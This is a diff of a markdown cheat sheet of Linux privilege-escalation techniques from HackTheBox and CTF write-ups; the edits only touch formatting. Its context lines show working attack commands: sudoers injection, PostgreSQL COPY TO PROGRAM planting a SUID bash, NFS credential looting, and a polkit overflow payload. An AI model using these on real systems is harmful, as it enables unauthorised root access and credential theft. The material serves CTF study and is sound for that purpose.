@@ -22,7 +22,7 @@ Techniques from HackTheBox machine writeups covering sudo abuse, service misconf
 - [Sudo Glob Path + Symlink Confused Deputy via vim (STEM CTF 2019)](#sudo-glob-path--symlink-confused-deputy-via-vim-stem-ctf-2019)
 - [TOCTOU Symlink Swap Race on FileChecker (STEM CTF 2019)](#toctou-symlink-swap-race-on-filechecker-stem-ctf-2019)
 
-------
+---
 
 ## Sudo Wildcard Parameter Injection via fnmatch (Dump HTB)
 
@@ -45,7 +45,7 @@ sudo /usr/bin/tcpdump -c10 \
 
 **Key insight:** Sudo wildcards use `fnmatch()` without `FNM_PATHNAME`, so `*` matches any characters including spaces and slashes. This means a single `*` in a sudoers rule can match across multiple injected arguments.
 
-------
+---
 
 ## Crafted Pcap for /etc/sudoers.d (Dump HTB)
 
@@ -62,7 +62,7 @@ payload = b"\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n"
 
 **Key insight:** Sudo's parser recovers from errors (yacc `error` productions skip to next newline) while cron's parser rejects the entire file on the first syntax error. This makes `/etc/sudoers.d/` a viable target for binary-format file injection while `/etc/cron.d/` is a dead end.
 
-------
+---
 
 ## Monit confcheck Process Command-Line Injection (Zero HTB)
 
@@ -81,7 +81,7 @@ perl -e '$0 = "/opt/app/bin/apache2 -k start -d /opt/app/conf -d /dev/shm/malcon
 
 **Key insight:** When a root script uses `pgrep` to extract a process command line and then executes a modified version, creating a fake process with extra arguments allows injecting flags into root-executed commands. Perl's `$0` or Python's `setproctitle` make process name spoofing trivial.
 
-------
+---
 
 ## Apache -d Last-Wins ServerRoot Override (Zero HTB)
 
@@ -106,7 +106,7 @@ cat /dev/shm/malconf/startup.log
 
 **Key insight:** Apache config parse errors expose file content in error messages. `Include /path/to/file` causes Apache to read the file and report its content as an "Invalid command" error — a reliable file-read primitive when combined with `-E` output redirection.
 
-------
+---
 
 ## Backup Cronjob SUID Abuse (Slonik HTB)
 
@@ -121,7 +121,7 @@ COPY (SELECT '') TO PROGRAM 'cp /bin/bash /var/lib/postgresql/14/main/bash && ch
 
 **Key insight:** When a root cronjob copies an entire directory, file ownership changes to root. SUID binaries in the source become root-owned SUID in the destination. The `-p` flag on bash preserves effective UID.
 
-------
+---
 
 ## PostgreSQL COPY TO PROGRAM RCE (Slonik HTB)
 
@@ -140,7 +140,7 @@ SELECT pg_read_file('/var/lib/postgresql/user.txt');
 
 **Key insight:** PostgreSQL superuser access is equivalent to OS command execution. `COPY TO PROGRAM` runs shell commands as the `postgres` user, and `pg_read_file()` reads arbitrary files on the filesystem without needing shell access.
 
-------
+---
 
 ## PostgreSQL Backup Credential Extraction (Slonik HTB)
 
@@ -156,7 +156,7 @@ showmount -e TARGET && mount -t nfs TARGET:/var/backups /mnt
 
 **Key insight:** PostgreSQL backups (`pg_basebackup`) contain `global/1260` which holds `pg_authid` -- the table with all password hashes. SCRAM-SHA-256 hashes can be cracked offline, and restoring the full backup in Docker gives access to all database contents including application credentials.
 
-------
+---
 
 ## SSH Unix Socket Tunneling (Slonik HTB)
 
@@ -172,12 +172,11 @@ PGPASSWORD='postgres' psql -h localhost -p 25432 -U postgres
 
 **Key insight:** SSH `-L localport:unix_socket_path` forwards to Unix sockets, not just TCP ports. `-T` prevents terminal allocation, `-f` backgrounds SSH, `-N` prevents command execution — together these work even with restricted shells like `/bin/false`.
 
-------
+---
 
 ## NFS Share Exploitation for Sensitive Data (Slonik HTB)
 
 Enumerate and mount NFS (Network File System) shares to find database backups, SSH keys, and config files with credentials:
-
 ```bash
 showmount -e TARGET
 # /var/backups (everyone)
@@ -185,12 +184,11 @@ showmount -e TARGET
 mount -t nfs TARGET:/var/backups /mnt/backups
 mount -t nfs TARGET:/home /mnt/home
 # Check for: database backups, SSH keys, config files with credentials
-
 ```
 
 **Key insight:** NFS shares exported with `(everyone)` access require no authentication. Always check `showmount -e` early in enumeration -- exposed `/home` directories often contain SSH keys, and `/var/backups` frequently holds database dumps with credentials.
 
-------
+---
 
 ## PaperCut Print Deploy Privilege Escalation (Bamboo HTB)
 
@@ -206,44 +204,39 @@ curl -b /tmp/cookies.txt "http://localhost:9191/print-deploy/admin/api/mobilityS
 
 # Execute SUID bash
 bash -p
-
 ```
 
 **Key insight:** When a root-owned service runs binaries or scripts from a user-writable directory, check `ls -la` on every file in the execution path. The systemd service file (`/etc/systemd/system/`) defines `ExecStart` but may lack `User=` directive, running everything as root.
 
-------
+---
 
 ## Squid Proxy Pivoting to Internal Services (Bamboo HTB)
 
 Route traffic through a Squid proxy to reach internal services not directly accessible:
-
 ```bash
 # Enumerate internal services through Squid proxy
 curl -x http://TARGET:3128 http://127.0.0.1:9191/app
 curl -x http://TARGET:3128 http://127.0.0.1:8080/
 # Set proxy for all tools:
 export http_proxy=http://TARGET:3128
-
 ```
 
 **Key insight:** Squid proxies on port 3128 are a pivot point to internal services bound to 127.0.0.1. Set `http_proxy` globally and access internal admin panels, databases, and APIs that are invisible from external scans.
 
-------
+---
 
 ## Zabbix Admin Password Reset via MySQL (Watcher HTB)
 
 With MySQL access to the Zabbix database, reset the admin password directly:
-
 ```sql
 -- Reset Zabbix admin password to "zabbix" (bcrypt hash)
 UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
 -- Note: username is case-sensitive ("Admin" not "admin")
-
 ```
 
 **Key insight:** With direct MySQL access to a Zabbix database, update the `users` table to set a known bcrypt hash as the admin password. The username is case-sensitive (`Admin` not `admin`), which is a common gotcha.
 
-------
+---
 
 ## WinSSHTerm Encrypted Credential Decryption (Atlas HTB)
 
@@ -257,7 +250,7 @@ WinSSHTerm (.NET) stores encrypted SSH credentials in `connections.xml` with key
 
 **Key insight:** Desktop SSH clients with "encrypted" credential storage are only as strong as the master password. Decompile the .NET binary, extract the crypto constants, and brute-force the master password. The encryption scheme's complexity is irrelevant if the master password is weak.
 
-------
+---
 
 ## sudo file -m Magic File Directory Traversal (OTW Advent 2018)
 
@@ -266,7 +259,6 @@ WinSSHTerm (.NET) stores encrypted SSH credentials in `connections.xml` with key
 ```bash
 sudo -u santa file -m /root/ .
 # Error output lists every filename under /root/
-
 ```
 
 Chain with `file -m /path/to/file -i -r .` to read file contents into the error channel when the file command tries to compile entries as magic.
@@ -275,7 +267,7 @@ Chain with `file -m /path/to/file -i -r .` to read file contents into the error 
 
 **References:** OverTheWire Advent 2018 — Lostpresent, writeup 12785
 
-------
+---
 
 ## CVE-2018-19788 — polkit UID Integer Overflow → Systemd RCE (OTW Advent 2018)
 
@@ -289,14 +281,13 @@ su loluser
 # ExecStart=/bin/bash -c 'cat /root/flag > /tmp/out'
 systemctl enable --now /home/loluser/pwn.service
 cat /tmp/out
-
 ```
 
 **Key insight:** Any integer-based permission check that compares with signed integers breaks for UID > INT_MAX. The patched version of polkit treats invalid UIDs as `root`'s opposite — *always deny*. Remembering the numeric constant 4020181224 lets you spot vulnerable boxes immediately.
 
 **References:** OverTheWire Advent Bonanza 2018 — writeup 12764
 
-------
+---
 
 ## Sudo Glob Path + Symlink Confused Deputy via vim (STEM CTF 2019)
 
@@ -310,14 +301,13 @@ ln -s /root/flag.txt ~/a/b/HackMe2.txt
 # sudo resolves the pathname string, but open() follows the symlink
 sudo /usr/bin/vim /home/ctf/a/b/HackMe2.txt
 # :!cat % inside vim prints /root/flag.txt contents
-
 ```
 
 **Key insight:** Sudoers path matching happens on the literal argv string, but the binary itself dereferences symlinks. Any "edit only this file" sudo rule that uses a wildcard is exploitable this way — not just vim (also `less`, `cat`, `head`, `tail`, `cp`, `chmod`, `truncate`, any tool that open()s the path). Defense requires `secure_path`, absolute paths without globs, and ideally a file-reading helper that calls `realpath()` and checks against an allow-list.
 
 **References:** STEM CTF: Cyber Challenge 2019 — January 8 2014, writeup 13301
 
-------
+---
 
 ## TOCTOU Symlink Swap Race on FileChecker (STEM CTF 2019)
 
